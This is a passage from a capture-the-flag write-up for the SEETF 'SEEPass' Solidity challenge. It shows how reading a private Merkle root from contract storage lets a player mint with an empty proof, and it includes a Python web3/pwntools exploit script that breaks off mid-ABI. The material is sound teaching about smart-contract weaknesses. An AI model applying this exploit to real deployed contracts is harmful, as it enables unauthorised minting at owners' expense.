</div><p>Okay, so with the given url and port, we can launch a new instance. Some informations that we can get:</p>
<ul>
<li>The private <code>rpc_endpoint</code>.</li>
<li>The private key of the player.</li>
<li>The setup contract address.</li>
</ul>
<p>However, up until now:</p>
<ul>
<li>We don&rsquo;t know yet the address of the deployed <code>SEEPass</code> via the <code>Setup</code> contract.</li>
<li>We don&rsquo;t know yet what is the <code>root</code> value.</li>
</ul>
<p>Let&rsquo;s re-visit the <code>Setup</code> contract.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Setup</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">SEEPass</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">pass</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To get the <code>SEEPass</code> address, because it is a <code>public</code> variable, by default, there will be a getter for it. We just need to call <code>pass()</code> to get the address.</p>
<p>Now that we know how to get the <code>SEEPass</code> address, we need to know how to fetch the <code>_merkleRoot</code> stored in it. Let&rsquo;s re-visit the <code>SEEPass</code> contract.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SEEPass</span> <span class="k">is</span> <span class="n">ERC721</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="k">private</span> <span class="n">_merkleRoot</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_root</span><span class="p">)</span> <span class="n">ERC721</span><span class="p">(</span><span class="s">&#34;SEE Pass&#34;</span><span class="p">,</span> <span class="s">&#34;SEEP&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">_merkleRoot</span> <span class="o">=</span> <span class="n">_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>_merkleRoot</code> was set as private variable, so there won&rsquo;t be a getter for it. However, nothing is private in a smart contract. Even though it&rsquo;s private, we can still fetch the value by directly accessing the <code>storage</code> of the contract. Trying to iterate the <code>storage</code> slot one by one, I found that the <code>_merkleRoot</code> was stored in slot 6.</p>
<p>After we know the <code>_merkleRoot</code> value, we can simply call the <code>mintSeePass()</code> function with empty <code>proof</code> and <code>_merkleRoot</code> as the <code>tokenId</code> (convert it to <code>uint256</code>). I used python web3 library to interact with the challenge.</p>
<h3 id="full-script">Full Script</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;win.the.seetf.sg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">8546</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">launch_instance</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Launch instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid:           &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;rpc endpoint:   &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rpc_endpoint</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;private key:    &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;setup contract: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">setup_address</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;UUID         : </span><span class="si">{</span><span class="n">uuid</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;rpc_endpoint : </span><span class="si">{</span><span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;private_key  : </span><span class="si">{</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;setup_address: </span><span class="si">{</span><span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">kill_instance</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Kill instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get Flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Launch instance</span>
</span></span><span class="line"><span class="cl"><span class="n">uuid</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">rpc_endpoint</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">private_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_address</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">uuid</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="p">,</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">setup_address</span> <span class="o">=</span> <span class="n">launch_instance</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Connect to the network</span>
</span></span><span class="line"><span class="cl"><span class="n">w3</span> <span class="o">=</span> <span class="n">Web3</span><span class="p">(</span><span class="n">Web3</span><span class="o">.</span><span class="n">HTTPProvider</span><span class="p">(</span><span class="n">rpc_endpoint</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">w3</span><span class="o">.</span><span class="n">is_connected</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">player</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">from_key</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get seepass address</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;_merkleRoot&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isSolved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;pass&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;contract SEEPass&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">}]</span>
</span></span><span class="line"><span class="cl"><span class="n">setup_contract</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">contract</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="n">setup_address</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">setup_abi</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pass_selector</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">keccak</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s1">&#39;pass()&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">call</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">setup_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">pass_selector</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">seepass_address</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_checksum_address</span><span class="p">(</span><span class="n">output</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;seepass address: </span><span class="si">{</span><span class="n">seepass_address</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Get merkle root value from storage slot</span>
</span></span><span class="line"><span class="cl"><span class="n">seepass_abi</span> <span class="o">=</span> <span class="p">[{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;_root&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bytes32&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;constructor&#34;</span><span class="p">},{</span><span class="s2">&#34;anonymous&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;owner&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;approved&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Approval&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;event&#34;</span><span class="p">},{</span><span class="s2">&#34;anonymous&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;owner&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;operator&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;approved&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ApprovalForAll&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;event&#34;</span><span class="p">},{</span><span class="s2">&#34;anonymous&#34;</span><span class="p">:</span><span class="kc">False</span><span class="p">,</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;from&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;to&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;indexed&#34;</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Transfer&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;event&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;to&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">},{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;approve&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;nonpayable&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;owner&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;balanceOf&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;getApproved&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;_tokenId&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;uint256&#34;</span><span class="p">}],</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;hasMinted&#34;</span><span class="p">,</span><span class="s2">&#34;outputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;bool&#34;</span><span class="p">}],</span><span class="s2">&#34;stateMutability&#34;</span><span class="p">:</span><span class="s2">&#34;view&#34;</span><span class="p">,</span><span class="s2">&#34;type&#34;</span><span class="p">:</span><span class="s2">&#34;function&#34;</span><span class="p">},{</span><span class="s2">&#34;inputs&#34;</span><span class="p">:[{</span><span class="s2">&#34;internalType&#34;</span><span class="p">:</span><span class="s2">&#34;address&#34;</span><span class="p">,</span><span class="s2">&#34;name&#34;</span><span class="p">:</span><span 